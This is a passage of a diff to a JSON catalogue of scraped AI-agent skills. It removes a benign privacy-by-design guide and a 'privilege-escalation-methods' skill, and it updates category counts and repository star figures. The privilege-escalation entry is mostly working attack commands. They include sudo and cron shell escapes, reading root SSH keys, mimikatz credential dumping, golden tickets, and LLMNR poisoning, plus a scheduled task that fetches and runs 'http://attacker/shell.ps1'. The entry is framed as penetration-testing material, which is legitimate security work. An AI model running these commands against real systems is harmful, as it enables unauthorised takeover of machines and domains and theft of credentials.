Limitation\nStore the purpose of each data point. Do not reuse data for purposes the user did not consent to.\n\n### 3. Storage Limitation\nDefine retention periods. Implement automated deletion or anonymization when retention expires. Never keep data \"forever\" by default.\n\n### 4. Privacy as Default\nOpt-in for optional collection, not opt-out. Sensitive settings (analytics, marketing) off by default. No pre-checked consent boxes.\n\n### 5. End-to-End Security\nEncrypt at rest and in transit. Use RBAC. Log access to sensitive data for audit.\n\n### 6. Transparency\nDocument what is collected and why. Clear privacy policies. Easy access and deletion for users.\n\n---\n\n## User Rights (GDPR)\n\nEnsure these are implementable from day one:\n\n| Right | What to build |\n|-------|---------------|\n| **Access** | Endpoint or flow to return all user data |\n| **Rectification** | Ability to update/correct data |\n| **Erasure** | Account deletion + data purge (including backups) |\n| **Portability** | Export data in machine-readable format (JSON, CSV) |\n\n---\n\n## Deep Dive: Why It Matters\n\n**Data minimization** — Less data = less breach impact, lower storage cost, simpler compliance. Each field is a liability.\n\n**Purpose limitation** — Reusing data without consent is illegal under GDPR. Document purpose in schema or metadata.\n\n**Retention** — Indefinite storage increases risk and violates GDPR. Define `retention_days` per data type; automate cleanup.\n\n**Logging** — Logs often leak PII. Redact emails, IDs, tokens. Use structured logging with allowlists.\n\n**Third parties** — Every SDK (analytics, crash reporting, ads) may send data elsewhere. Audit dependencies; require consent before loading.\n\n---\n\n## Code Examples\n\n### JavaScript/Node — Minimal User Model\n\n```javascript\n// BAD: Collecting everything \"just in case\"\nconst user = { email, name, phone, address, birthdate, ipAddress, userAgent, ... };\n\n// GOOD: Minimal, documented purpose\nconst user = {\n  email,        // purpose: authentication\n  displayName,  // purpose: UI display\n  createdAt,    // purpose: account age\n};\n```\n\n### JavaScript — Consent Before Tracking\n\n```javascript\n// BAD: Track first, ask later\nanalytics.track(userId, event);\n\n// GOOD: Check consent first\nif (userConsent.analytics) {\n  analytics.track(userId, event);\n}\n```\n\n### Python — Safe Logging\n\n```python\n# BAD: Logging PII in plain text\nlogger.info(f\"User {user.email} logged in from {request.remote_addr}\")\n\n# GOOD: Redact or hash identifiers\nlogger.info(f\"User {hash_user_id(user.id)} logged in\")\n# Or: logger.info(\"User login\", extra={\"user_id_hash\": hash_id(user.id)})\n```\n\n### SQL — Schema with Purpose and Retention\n\n```sql\n-- GOOD: Document purpose and retention in schema\nCREATE TABLE users (\n  id UUID PRIMARY KEY,\n  email VARCHAR(255) NOT NULL,  -- purpose: auth, retention: account lifetime\n  display_name VARCHAR(100),   -- purpose: UI, retention: account lifetime\n  created_at TIMESTAMPTZ,      -- purpose: audit, retention: 7 years\n  last_login_at TIMESTAMPTZ    -- purpose: security, retention: 90 days\n);\n\n-- Add retention policy (PostgreSQL example)\n-- Schedule job to anonymize/delete last_login_at after 90 days\n```\n\n### API — Return Only Needed Fields\n\n```python\n# BAD: Returning full user object\nreturn jsonify(user)  # May include internal fields, hashed passwords\n\n# GOOD: Explicit allowlist\nreturn jsonify({\n    \"id\": user.id,\n    \"email\": user.email,\n    \"displayName\": user.display_name,\n})\n```\n\n---\n\n## Common Pitfalls\n\n| Pitfall | Solution |\n|---------|----------|\n| Logs contain emails, IPs, tokens | Redact PII; use hashed IDs or structured logs |\n| Error messages expose data | Return generic errors to clien",
-      "tags": [
-        "python",
-        "javascript",
-        "node",
-        "api",
-        "ai",
-        "agent",
-        "design",
-        "document",
-        "security",
-        "rag"
-      ],
-      "useCases": [
-        "Use when building apps that collect personal data (names, emails, locations, preferences)",
-        "Use when designing database schemas, APIs, or authentication flows",
-        "Use when the user mentions forms, user accounts, analytics, or third-party integrations",
-        "Use when deploying to production—verify privacy controls before launch"
-      ],
-      "scrapedAt": "2026-03-14T07:04:52.036Z"
-    },
-    {
-      "id": "antigravity-privilege-escalation-methods",
-      "name": "privilege-escalation-methods",
-      "slug": "privilege-escalation-methods",
-      "description": "Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations.",
-      "category": "Security & Systems",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/privilege-escalation-methods",
-      "content": "\n# Privilege Escalation Methods\n\n## Purpose\n\nProvide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations.\n\n## Inputs/Prerequisites\n\n- Initial low-privilege shell access on target system\n- Kali Linux or penetration testing distribution\n- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus\n- Understanding of Windows/Linux privilege models\n- For AD attacks: Domain user credentials and network access to DC\n\n## Outputs/Deliverables\n\n- Root or Administrator shell access\n- Extracted credentials and hashes\n- Persistent access mechanisms\n- Domain compromise (for AD environments)\n\n---\n\n## Core Techniques\n\n### Linux Privilege Escalation\n\n#### 1. Abusing Sudo Binaries\n\nExploit misconfigured sudo permissions using GTFOBins techniques:\n\n```bash\n# Check sudo permissions\nsudo -l\n\n# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'\nsudo less /etc/hosts    # then type: !bash\nsudo man man            # then type: !bash\nsudo env /bin/bash\n```\n\n#### 2. Abusing Scheduled Tasks (Cron)\n\n```bash\n# Find writable cron scripts\nls -la /etc/cron*\ncat /etc/crontab\n\n# Inject payload into writable script\necho 'chmod +s /bin/bash' > /home/user/systemupdate.sh\nchmod +x /home/user/systemupdate.sh\n\n# Wait for execution, then:\n/bin/bash -p\n```\n\n#### 3. Abusing Capabilities\n\n```bash\n# Find binaries with capabilities\ngetcap -r / 2>/dev/null\n\n# Python with cap_setuid\n/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# Perl with cap_setuid\n/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n\n# Tar with cap_dac_read_search (read any file)\n/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa\n/usr/bin/tar -xvf key.tar\n```\n\n#### 4. NFS Root Squashing\n\n```bash\n# Check for NFS shares\nshowmount -e <victim_ip>\n\n# Mount and exploit no_root_squash\nmkdir /tmp/mount\nmount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount\ncd /tmp/mount\ncp /bin/bash .\nchmod +s bash\n```\n\n#### 5. MySQL Running as Root\n\n```bash\n# If MySQL runs as root\nmysql -u root -p\n\\! chmod +s /bin/bash\nexit\n/bin/bash -p\n```\n\n---\n\n### Windows Privilege Escalation\n\n#### 1. Token Impersonation\n\n```powershell\n# Using SweetPotato (SeImpersonatePrivilege)\nexecute-assembly sweetpotato.exe -p beacon.exe\n\n# Using SharpImpersonation\nSharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser\n```\n\n#### 2. Service Abuse\n\n```powershell\n# Using PowerUp\n. .\\PowerUp.ps1\nInvoke-ServiceAbuse -Name 'vds' -UserName 'domain\\user1'\nInvoke-ServiceAbuse -Name 'browser' -UserName 'domain\\user1'\n```\n\n#### 3. Abusing SeBackupPrivilege\n\n```powershell\nimport-module .\\SeBackupPrivilegeUtils.dll\nimport-module .\\SeBackupPrivilegeCmdLets.dll\nCopy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit\n```\n\n#### 4. Abusing SeLoadDriverPrivilege\n\n```powershell\n# Load vulnerable Capcom driver\n.\\eoploaddriver.exe System\\CurrentControlSet\\MyService C:\\test\\capcom.sys\n.\\ExploitCapcom.exe\n```\n\n#### 5. Abusing GPO\n\n```powershell\n.\\SharpGPOAbuse.exe --AddComputerTask --Taskname \"Update\" `\n  --Author DOMAIN\\<USER> --Command \"cmd.exe\" `\n  --Arguments \"/c net user Administrator Password!@# /domain\" `\n  --GPOName \"ADDITIONAL DC CONFIGURATION\"\n```\n\n---\n\n### Active Directory Attacks\n\n#### 1. Kerberoasting\n\n```bash\n# Using Impacket\nGetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request\n\n# Using CrackMapExec\ncrackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt\n```\n\n#### 2. AS-REP Roasting\n\n```powershell\n.\\Rubeus.exe asreproast\n```\n\n#### 3. Golden Ticket\n\n```powershell\n# DCSync to get krbtgt hash\nmimikatz# lsadump::dcsync /user:krbtgt\n\n# Create golden ticket\nmimikatz# kerberos::golden /user:Administrator /domain:domain.local `\n  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500\n```\n\n#### 4. Pass-the-Ticket\n\n```powershell\n.\\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt\nklist  # Verify ticket\n```\n\n#### 5. Golden Ticket with Scheduled Tasks\n\n```powershell\n# 1. Elevate and dump credentials\nmimikatz# token::elevate\nmimikatz# vault::cred /patch\nmimikatz# lsadump::lsa /patch\n\n# 2. Create golden ticket\nmimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `\n  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi\n\n# 3. Create scheduled task\nschtasks /create /S DOMAIN /SC Weekly /RU \"NT Authority\\SYSTEM\" `\n  /TN \"enterprise\" /TR \"powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'\"\nschtasks /run /s DOMAIN /TN \"enterprise\"\n```\n\n---\n\n### Credential Harvesting\n\n#### LLMNR Poisoning\n\n```bash\n# Start Responder\nresponder -I eth1 -v\n\n# Create malicious shortcut (Book.url)\n[InternetShortcut]\nURL=https://facebook.com\nIconIndex=0\nIconFile=\\\\attacker_ip\\not_found.ico\n```\n\n#### NTLM Relay\n\n```bash\nresponder -I eth1 ",
-      "tags": [
-        "python",
-        "ai",
-        "llm",
-        "workflow",
-        "document",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:51.767Z"
-    },
-    {
       "id": "composio-raffle-winner-picker",
       "name": "raffle-winner-picker",
       "slug": "raffle-winner-picker",
@@ -26673,7 +26688,7 @@
       "name": "AI & Agents",
       "description": "AI agent development, memory systems, and autonomous workflows.",
       "icon": "bot",
-      "count": 377
+      "count": 378
     },
     {
       "id": "document-processing",
@@ -26687,7 +26702,7 @@
       "name": "Development & Code Tools",
       "description": "Tools for building, testing, and deploying software with AI assistance.",
       "icon": "code",
-      "count": 125
+      "count": 126
     },
     {
       "id": "creative-media",
@@ -26701,14 +26716,14 @@
       "name": "Security & Systems",
       "description": "Security analysis, system administration, and forensics.",
       "icon": "shield",
-      "count": 75
+      "count": 74
     },
     {
       "id": "business-marketing",
       "name": "Business & Marketing",
       "description": "Skills for marketing, branding, lead generation, and business operations.",
       "icon": "briefcase",
-      "count": 52
+      "count": 51
     },
     {
       "id": "productivity-organization",
@@ -26745,48 +26760,48 @@
       "url": "https://github.com/obra/superpowers",
       "skillCount": 14,
       "newSkillCount": 0,
-      "stars": 172163
+      "stars": 173765
     },
     {
       "name": "Anthropic",
       "url": "https://github.com/anthropics/skills",
       "skillCount": 14,
       "newSkillCount": 3,
-      "stars": 125745
+      "stars": 126343
     },
     {
       "name": "ComposioHQ",
       "url": "https://github.com/ComposioHQ/awesome-claude-skills",
       "skillCount": 19,
       "newSkillCount": 8,
-      "stars": 56990
+      "stars": 57174
     },
     {
       "name": "OpenHands",
       "url": "https://github.com/OpenHands/OpenHands",
       "skillCount": 25,
       "newSkillCount": 1,
-      "stars": 72321
+      "stars": 72389
     },
     {
       "name": "Awesome LLM",
       "url": "https://github.com/Prat011/awesome-llm-skills",
       "skillCount": 26,
       "newSkillCount": 0,
-      "stars": 1172
+      "stars": 1185
     },
     {
       "name": "Antigravity",
       "url": "https://github.com/sickn33/antigravity-awesome-skills",
       "skillCount": 1002,
-      "newSkillCount": 6,
-      "stars": 35620
+      "newSkillCount": 10,
+      "stars": 35771
     }
   ],
-  "lastUpdated": "2026-04-29T08:36:43.127Z",
+  "lastUpdated": "2026-04-30T08:36:27.090Z",
   "stats": {
     "totalSkills": 1100,
-    "newSkills": 18,
-    "scrapedAt": "2026-04-29T08:36:43.127Z"
+    "newSkills": 22,
+    "scrapedAt": "2026-04-30T08:36:27.090Z"
   }
 }
